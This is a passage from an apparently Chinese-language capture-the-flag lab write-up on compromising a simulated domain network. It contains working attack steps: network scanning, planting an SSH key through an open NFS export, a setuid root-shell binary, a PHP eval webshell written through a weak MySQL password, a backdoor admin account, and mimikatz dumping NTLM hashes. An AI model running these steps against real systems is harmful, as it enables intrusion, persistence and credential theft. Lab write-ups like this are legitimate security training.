15:59:55] [SUCCESS] 端口开放 172.22.13.28:3306</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:8000</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:8080</span><br><span class="line">[2025-04-27 15:59:55] [SUCCESS] 服务识别 172.22.13.57:22 =&gt; [ssh] 版本: 7.4 产品: OpenSSH 信息: protocol 2.0 Banner: [SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-27 15:59:56] [SUCCESS] 服务识别 172.22.13.14:22 =&gt; [ssh] 版本: 8.2p1 Ubuntu 4ubuntu0.5 产品: OpenSSH 系统: Linux  信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-27 15:59:56] [SUCCESS] 服务识别 172.22.13.14:21 =&gt; [ftp] 版本: 3.0.3 产品: vsftpd 系统: Unix Banner: [220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.57:80 =&gt; [http] 版本: 1.20.1 产品: nginx</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:445 =&gt;</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:88 =&gt;</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:80 =&gt; [http]</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:139 =&gt;  Banner: [.]</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:389 =&gt;</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:139 =&gt;  Banner: [.]</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:445 =&gt;</span><br><span class="line">[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:8000 =&gt;</span><br><span class="line">[2025-04-27 16:00:02] [SUCCESS] 服务识别 172.22.13.14:8080 =&gt; [http]</span><br><span class="line">[2025-04-27 16:00:02] [SUCCESS] 服务识别 172.22.13.14:80 =&gt; [http]</span><br><span class="line">[2025-04-27 16:00:09] [SUCCESS] 服务识别 172.22.13.28:3306 =&gt;  Banner: [!.#08S01Got packets out of order]</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 服务识别 172.22.13.28:135 =&gt;</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 服务识别 172.22.13.6:135 =&gt;</span><br><span class="line">[2025-04-27 16:01:01] [INFO] 存活端口数量: 17</span><br><span class="line">[2025-04-27 16:01:01] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-27 16:01:01] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.57       状态码: 200 长度: 4833   标题: Welcome to CentOS</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.13.6</span><br><span class="line">主机名: WIN-DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4 地址:</span><br><span class="line">      └─ 172.22.13.6</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.28       状态码: 200 长度: 2525   标题: 欢迎登录 OA 办公平台</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.6     DC: XIAORANG\WIN-DC</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.14       状态码: 200 长度: 10918  标题: Apache2 Ubuntu Default Page: It works</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.13.28</span><br><span class="line">主机名: WIN-HAUWOLAO</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4 地址:</span><br><span class="line">      └─ 172.22.13.28</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.14:8080  状态码: 200 长度: 3655   标题: 公司发货单</span><br><span class="line">[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.28:8000  状态码: 200 长度: 170    标题: Nothing Here.</span><br></pre></td></tr></table></figure>

<p>题目提示了要打 NFS，先扫一下 2049 的端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ./fscan2 -h 172.22.13.14/24 -p 2049</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     _ __  __ _ _ __ __ _  _ __| | __    │</span><br><span class="line">│  / /_\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_ ____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \_ _,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-27 16:07:15] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-27 16:07:15] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-27 16:07:15] [INFO] CIDR 范围: 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-04-27 16:07:15] [INFO] 生成 IP 范围: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)</span><br><span class="line">[2025-04-27 16:07:16] [INFO] 解析 CIDR 172.22.13.14/24 -&gt; IP 范围 172.22.13.0-172.22.13.255</span><br><span class="line">[2025-04-27 16:07:16] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-27 16:07:16] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.6     存活 (ICMP)</span><br><span class="line">[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.14    存活 (ICMP)</span><br><span class="line">[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.28    存活 (ICMP)</span><br><span class="line">[2025-04-27 16:07:16] [SUCCESS] 目标 172.22.13.57    存活 (ICMP)</span><br><span class="line">[2025-04-27 16:07:19] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-27 16:07:19] [INFO] 有效端口数量: 1</span><br><span class="line">[2025-04-27 16:07:19] [SUCCESS] 端口开放 172.22.13.57:2049</span><br></pre></td></tr></table></figure>

<p>172.22.13.57 开了 2049 的端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#在靶机上操作</span><br><span class="line">root@ubuntu:~# showmount -e 172.22.13.57</span><br><span class="line">Export list for 172.22.13.57:</span><br><span class="line">/home/joyce *</span><br><span class="line">root@ubuntu:~# cd /tmp</span><br><span class="line">root@ubuntu:/tmp# mkdir test</span><br><span class="line">root@ubuntu:/tmp# mount -t nfs 172.22.13.57:/ ./test -o nolock</span><br></pre></td></tr></table></figure>

<p>然后 joyce 的家目录就被成功挂载了，写一个公钥进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp/test/home/joyce# mkdir .ssh</span><br><span class="line">root@ubuntu:/tmp/test/home/joyce# cd .ssh</span><br><span class="line">root@ubuntu:/tmp/test/home/joyce/.ssh# echo &#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcatU49PfwyMAfrfJcaaIFCNOJNWOdDonEg3ahNxG8H root@kali&#x27;&gt; authorized_keys</span><br></pre></td></tr></table></figure>

<p>然后 ssh 连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/123]</span><br><span class="line">└─# proxy -f proxychains4.conf ssh joyce@172.22.13.57</span><br><span class="line">[proxychains] config file found: proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.13.57:22  ...  OK</span><br><span class="line">The authenticity of host &#x27;172.22.13.57 (172.22.13.57)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256: Y8qbRlvlJKReDyk1mEsy/A7aQosNyeucM/GZs7aI8SA.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;172.22.13.57&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">Last login: Thu Aug 11 18:16:01 2022</span><br><span class="line"></span><br><span class="line">Welcome to Alibaba Cloud Elastic Compute Service !</span><br><span class="line"></span><br><span class="line">[joyce@centos ~]$ ls</span><br><span class="line">[joyce@centos ~]$ ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 joyce joyce 4096 Apr 27 16:11 .</span><br><span class="line">drwxr-xr-x. 4 root  root  4096 Aug 10  2022 ..</span><br><span class="line">-rw-------  1 joyce joyce    5 Aug 11  2022 .bash_history</span><br><span class="line">-rw-r--r--  1 joyce joyce   18 Nov 25  2021 .bash_logout</span><br><span class="line">-rw-r--r--  1 joyce joyce  193 Nov 25  2021 .bash_profile</span><br><span class="line">-rw-r--r--  1 joyce joyce  231 Nov 25  2021 .bashrc</span><br><span class="line">drwxr-xr-x  2 root  root  4096 Apr 27 16:12 .ssh</span><br><span class="line">[joyce@centos ~]$</span><br></pre></td></tr></table></figure>

<p>尝试提权，查找 suid 权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[joyce@centos ~]$ find / -perm -u = s 2 &gt;/dev/null</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/ftp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>

<p>ftp 提权可以读文件，也可以通过 nfs 上传一个恶意文件拿到 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# echo &#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27; &gt; root.c</span><br><span class="line">root@ubuntu:/tmp# gcc root.c -o root</span><br><span class="line">root.c: In function ‘main’:</span><br><span class="line">root.c: 1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class="line">    1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br><span class="line">      |              ^~~~~~</span><br><span class="line">root.c: 1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br><span class="line">      |                         ^~~~~~</span><br><span class="line">root.c: 1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">    1 | int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br><span class="line">      |</span><br><span class="line">root@ubuntu:/tmp# chmod +s ./root</span><br><span class="line">root@ubuntu:/tmp# mv root ./test/home/joyce/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[joyce@centos ~]$ ls</span><br><span class="line">root</span><br><span class="line">[joyce@centos ~]$ ./root</span><br><span class="line">[root@centos ~]# id</span><br><span class="line">uid = 0(root) gid = 0(root) groups = 0(root),994(joyce)</span><br></pre></td></tr></table></figure>

<p>flag02 在根目录下</p>
<h1 id="FLAG03"><a href="#FLAG03" class="headerlink" title="FLAG03"></a>FLAG03</h1><p> 172.22.13.28 是一个 OA 系统，用 fscan 扫一下全端口，可以扫到 mysql 有弱口令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root: 123456</span><br></pre></td></tr></table></figure>

<p>navicat 连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line">mysql &gt; show variables like &quot;%general%&quot;;</span><br><span class="line">+------------------+--------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                        |</span><br><span class="line">+------------------+--------------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                          |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\Extensions\MySQL5.7.26\data\WIN-HAUWOLAO.log |</span><br><span class="line">+------------------+--------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.06 sec)</span><br></pre></td></tr></table></figure>

<p>尝试写马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接，flag03 在 C:/Users/Administrator/flag/下</p>
<h1 id="FLAG04"><a href="#FLAG04" class="headerlink" title="FLAG04"></a>FLAG04</h1><p>创建一个用户，添加进用户组里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag &gt; net user lv Asd123123 /add</span><br><span class="line">命令成功完成。</span><br><span class="line"> </span><br><span class="line">C:\Users\Administrator\flag &gt; net localgroup administrators lv /add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<p>然后远程桌面连接，上传一个 mimikatz 抓取哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege:: debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # log</span><br><span class="line">Using &#x27;mimikatz.log&#x27; for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa:: logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 11159151 (00000000:00aa466f)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : lv</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/4/27 16:53:43</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : lv</span><br><span class="line">         * Domain   : WIN-HAUWOLAO</span><br><span class="line">         * NTLM     : 85edf6aacad2ac8e2a7a44741eb0b236</span><br><span class="line">         * SHA1     : aab02ea07aee541e9f60a1f6d5a54a2045965743</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : lv</span><br><span class="line">         * Domain   : WIN-HAUWOLAO</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : lv</span><br><span class="line">         * Domain   : WIN-HAUWOLAO</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 11136230 (00000000:00a9ece6)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 16:53:43</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25</span><br><span class="line">         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 11136190 (00000000:00a9ecbe)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/4/27 16:53:43</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN-HAUWOLAO$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25</span><br><span class="line">         * SHA1     : 